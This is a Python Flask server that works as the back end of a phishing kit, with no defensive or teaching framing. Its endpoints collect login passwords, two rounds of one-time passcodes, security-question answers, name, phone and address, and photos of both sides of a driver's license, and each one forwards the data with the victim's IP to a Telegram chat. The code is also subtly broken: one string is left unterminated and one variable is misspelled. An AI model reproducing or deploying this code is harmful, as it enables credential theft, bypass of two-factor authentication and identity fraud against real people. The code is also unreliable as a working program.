from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
import bleach

# Load environment variables from .env file (for local testing)
load_dotenv()

app = Flask(__name__)

# Configure CORS to allow requests from Vercel domain
CORS(app, resources={r"/*": {"origins": "*"}})

# Telegram Bot Token and Chat ID from environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

# Input sanitization function
def sanitize_input(text):
    """Sanitize input to prevent injection attacks."""
    return bleach.clean(str(text), tags=[], attributes={}, strip=True) if text else ""

@app.route('/submit', methods=['POST'])
def submit_form():
    # Extract form data
    username = sanitize_input(request.form.get('username'))
    password = sanitize_input(request.form.get('password'))
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 LOGIN Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Data sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-login', methods=['POST'])
def submit_login():
    # Extract form data
    username = sanitize_input(request.form.get('username'))
    password = sanitize_input(request.form.get('password'))
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 Login2 Page Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Login data sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-otp', methods=['POST'])
def submit_otp():
    # Extract OTP data
    otp = sanitize_input(request.form.get('otp'))
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not otp:
        return jsonify({"error": "Missing OTP"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "OTP sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-otp2', methods=['POST'])
def submit_otp2():
    # Extract OTP data
    otp = sanitize_input(request.form.get('otp'))
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not otp:
        return jsonify({"error": "Missing OTP"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 Second OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Second OTP sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-security', methods=['POST'])
def submit_security():
    # Extract form data
    sec_q_1 = sanitize_input(request.form.get('sec_q_1'))
    sec_q_11 = sanitize_input(request.form.get('sec_q_11'))
    sec_a_1 = sanitize_input(request.form.get('sec_a_1'))
    sec_q_2 = sanitize_input(request.form.get('sec_q_2'))
    sec_q_22 = sanitize_input(request.form.get('sec_q_22'))
    sec_a_2 = sanitize_input(request.form.get('sec_a_2'))
    sec_q_3 = sanitize_input(request.form.get('sec_q_3'))
    sec_q_33 = sanitize_input(request.form.get('sec_q_33'))
    sec_a_3 = sanitize_input(request.form.get('sec_a_3'))
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Validate inputs
    if sec_q_1 == "0" or not sec_a_1 or (sec_q_1 == "x" and not sec_q_11):
        return jsonify({"error": "Missing or invalid input for Security Question 1"}), 400
    if sec_q_2 == "0" or not sec_a_2 or (sec_q_2 == "x" and not sec_q_22):
        return jsonify({"error": "Missing or invalid input for Security Question 2"}), 400
    if sec_q_3 == "0" or not sec_a_3 or (sec_q_3 == "x" and not sec_q_33):
        return jsonify({"error": "Missing or invalid input for Security Question 3"}), 400

    # Use custom questions if provided
    final_q_1 = sec_q_11 if sec_q_1 == "x" else sec_q_1
    final_q_2 = sec_q_22 if sec_q_2 == "x" else sec_q_2
    final_q_3 = sec_q_33 if sec_q_3 == "x" else sec_q_3

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 Security Questions Submission\n<code>Question 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}</code>"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHaAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Security questions sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-info', methods=['POST'])
def submit_info():
    # Extract form data
    fname = sanitize_input(request.form.get('fname'))
    mobnum = sanitize_input(request.form.get('mobnum'))
    address = sanitize_input(request.form.get('address'))
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Validate inputs
    if not all([fname, mobnum, address]):
        return jsonify({"error": "All fields are required"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 Personal Info Submission\n<code>Full Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nuser Ip: {user_ip}</code>"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()
        return jsonify({"status": "success", "message": "Personal info sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

@app.route('/submit-images', methods=['POST'])
def submit_images():
    # Extract image files and user IP
    image1 = request.files.get('image')
    image2 = request.files.get('image2')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if not image1 or not image2:
        return jsonify({"error": "Missing one or both images"}), 400

    # Format message for Telegram with <code> tags for click-to-copy
    message = f"🔐 Image Submission\n<code>Images: Driver License Front and Back\nuser Ip: {user_ip}</code>"

    # Send text message to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            },
            timeout=5
        )
        response.raise_for_status()

        # Send images to Telegram using sendPhoto
        telegram_photo_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        for img in [image1, image2]:
            img.seek(0)  # Reset file pointer
            response = requests.post(
                telegram_photo_url,
                data={"chat_id": TELEGRAM_CHAT_ID},
                files={"photo": (img.filename, img, img.mimetype)},
                timeout=5
            )
            response.raise_for_status()

        return jsonify({"status": "success", "message": "Images sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))

